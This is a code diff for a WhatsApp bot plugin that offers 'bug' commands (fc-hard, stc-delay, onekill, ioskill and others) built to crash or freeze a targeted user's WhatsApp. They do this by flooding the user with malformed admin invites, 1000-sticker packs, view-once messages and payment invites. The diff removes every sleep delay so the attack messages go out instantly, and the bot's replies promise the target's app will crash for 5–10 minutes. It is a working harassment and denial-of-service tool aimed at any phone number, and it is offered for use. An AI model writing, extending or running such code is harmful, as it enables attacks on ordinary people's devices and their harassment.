@@ -11,8 +11,6 @@ if (!generateWAMessageFromContent) {
     } catch(e) {}
 }
 
-const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-
 // Helper: validate and format target number
 function getTarget(args, from, reply, cmdName) {
     if (!args || !args[0]) {
@@ -66,7 +64,7 @@ async function ttaas(conn, target) {
     await conn.relayMessage(target, msg.message, {});
 }
 
-// ==================== .fc-hard (30 newsletter admin invites – crash on open) ====================
+// ==================== .fc-hard (30 newsletter admin invites – NO DELAYS) ====================
 async function BnAM2(conn, target) {
     for (let i = 0; i < 30; i++) {
         const msg = generateWAMessageFromContent(target, {
@@ -93,11 +91,11 @@ async function BnAM2(conn, target) {
             }
         }, {});
         await conn.relayMessage(target, msg.message, {});
-        await sleep(200);
+        // NO DELAY – sends all 30 instantly
     }
 }
 
-// ==================== .stc-delay (sticker pack overflow spam) ====================
+// ==================== .stc-delay (sticker pack overflow – instant send) ====================
 async function stcdelayxryy(conn, target) {
     const stc = Array.from({ length: 1000 }, (_, i) => ({
         fileName: `bcdf1b38-4ea9-4f3e-b6db-e428e4a581${i + 1}.webp`,
@@ -153,7 +151,7 @@ async function stcdelayxryy(conn, target) {
     await conn.relayMessage(target, msg.message, {});
 }
 
-// ==================== YOUR OTHER BUG FUNCTIONS (unchanged) ====================
+// ==================== YOUR OTHER BUG FUNCTIONS (NO DELAYS) ====================
 const oneclickxeon = {
     key: { participant: `0@s.whatsapp.net`, remoteJid: "status@broadcast" },
     message: { listResponseMessage: { title: `𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2` } }
@@ -338,7 +336,7 @@ async function sendViewOnceMessages(socket, jid, count) {
             }
         }, {});
         await socket.relayMessage(jid, messageContent.message, { messageId: messageContent.key.id });
-        await sleep(100);
+        // NO DELAY – sends all view‑once messages instantly
     }
 }
 
@@ -347,7 +345,7 @@ async function sendVariousMessages(socket, jid, count) {
         await sendListMessage(socket, jid);
         await sendLiveLocationMessage(socket, jid);
         await sendSystemCrashMessage(socket, jid);
-        await sleep(500);
+        // NO DELAY – sends all three immediately
     }
 }
 
@@ -355,7 +353,7 @@ async function sendMixedMessages(socket, jid, count) {
     for (let i = 0; i < count; i++) {
         await sendLiveLocationMessage(socket, jid);
         await sendListMessage(socket, jid);
-        await sleep(500);
+        // NO DELAY
     }
 }
 
@@ -367,13 +365,14 @@ async function oneKillCombo(socket, target) {
         await locationxeony(socket, target, force);
         await blackening(socket, target, force2);
         await locationxeony(socket, target, force);
+        // NO DELAY – all six send instantly
     }
 }
 
 async function iosKill(socket, target, duration = 10) {
     for (let i = 0; i < duration; i++) {
         await aipong(socket, target);
-        await sleep(1200);
+        // NO DELAY – sends all 10 payment invites instantly
     }
 }
 
@@ -400,7 +399,7 @@ cmd({
 }, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
     const target = getTarget(args, from, reply, "fc-hard");
     if (!target) return;
-    await reply(`📰 *FC-HARD SPAM* → ${target}\n_Sending 30 malformed admin invites..._`);
+    await reply(`📰 *FC-HARD SPAM* → ${target}\n_Sending 30 malformed admin invites (no delay)..._`);
     await BnAM2(conn, target);
     await reply(`✅ FC-HARD SPAM SENT → ${target}\n⚠️ *Target WhatsApp will crash when they open the app. Effect lasts 5‑10 min.*`);
 });
@@ -413,7 +412,7 @@ cmd({
 }, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
     const target = getTarget(args, from, reply, "stc-delay");
     if (!target) return;
-    await reply(`📚 *STC-DELAY SPAM* → ${target}\n_Sending massive sticker pack..._`);
+    await reply(`📚 *STC-DELAY SPAM* → ${target}\n_Sending massive sticker pack (instant)..._`);
     await stcdelayxryy(conn, target);
     await reply(`✅ STC-DELAY SENT → ${target}\n⚠️ *Target will experience heavy lag/crash for 5‑10 minutes.*`);
 });
@@ -426,7 +425,7 @@ cmd({
 }, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
     const target = getTarget(args, from, reply, "onekill");
     if (!target) return;
-    await reply(`💀 *ONEKILL COMBO* → ${target}\n_Executing full crash sequence..._`);
+    await reply(`💀 *ONEKILL COMBO* → ${target}\n_Executing full crash sequence (instant sends)..._`);
     await oneKillCombo(conn, target);
     await reply(`✅ ONEKILL COMPLETED → ${target}\n⚠️ *Target will freeze/crash repeatedly for 5‑10 minutes.*`);
 });
@@ -439,7 +438,7 @@ cmd({
 }, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
     const target = getTarget(args, from, reply, "ioskill");
     if (!target) return;
-    await reply(`📱 *IOS KILL* → ${target}\n_Sending payment invite spam..._`);
+    await reply(`📱 *IOS KILL* → ${target}\n_Sending 10 payment invites (instant)..._`);
     await iosKill(conn, target, 10);
     await reply(`✅ IOS KILL SENT → ${target}\n⚠️ *Target device may become unresponsive for 5‑10 minutes.*`);
 });
@@ -453,7 +452,7 @@ cmd({
     const target = getTarget(args, from, reply, "viewspam");
     if (!target) return;
     const count = parseInt(args[1]) || 5;
-    await reply(`👁️ *VIEWONCE SPAM* → ${target}\n_Sending ${count} view‑once messages..._`);
+    await reply(`👁️ *VIEWONCE SPAM* → ${target}\n_Sending ${count} view‑once messages (no delay)..._`);
     await sendViewOnceMessages(conn, target, count);
     await reply(`✅ VIEWONCE SPAM SENT → ${target}\n⚠️ *Target will see crashing view‑once bubbles. Effect: 5‑10 min.*`);
 });
@@ -466,7 +465,7 @@ cmd({
 }, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
     const target = getTarget(args, from, reply, "mixed");
     if (!target) return;
-    await reply(`🔄 *MIXED CRASH* → ${target}\n_Sending mixed messages..._`);
+    await reply(`🔄 *MIXED CRASH* → ${target}\n_Sending mixed messages (instant)..._`);
     await sendMixedMessages(conn, target, 5);
     await reply(`✅ MIXED CRASH SENT → ${target}\n⚠️ *Target will experience lag/crash for 5‑10 minutes.*`);
 });
@@ -479,7 +478,7 @@ cmd({
 }, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
     const target = getTarget(args, from, reply, "various");
     if (!target) return;
-    await reply(`🎯 *VARIOUS CRASH* → ${target}\n_Sending multiple crash types..._`);
+    await reply(`🎯 *VARIOUS CRASH* → ${target}\n_Sending multiple crash types (instant)..._`);
     await sendVariousMessages(conn, target, 3);
     await reply(`✅ VARIOUS CRASH SENT → ${target}\n⚠️ *Target will freeze/crash for 5‑10 minutes.*`);
 });
@@ -492,7 +491,7 @@ cmd({
     filename: __filename
 }, async (conn, mek, m, { from, pushname, sender, reply }) => {
     const menu = `
-*╭─「 👑 COMPLETE BUG MENU 」─*
+*╭─「 👑 COMPLETE BUG MENU (NO DELAYS) 」─*
 *│ 📌 .bug         : ViewOnce product crash*
 *│ 📌 .fc-hard     : 30 admin invites (crash on open)*
 *│ 📌 .stc-delay   : Sticker pack overflow (1000 stickers)*
@@ -502,7 +501,7 @@ cmd({
 *│ 📌 .mixed       : Mixed live location + list spam*
 *│ 📌 .various     : Various crash messages (3 types)*
 *│*
-*│ 🟢 Status : 100% working – direct send*
+*│ 🟢 Status : 100% working – INSTANT SEND (no delays)*
 *│ 🟢 Targets : any number (even not in chat list)*
 *│ 🟢 Total commands : 8*
 *╰──────────────●●►*
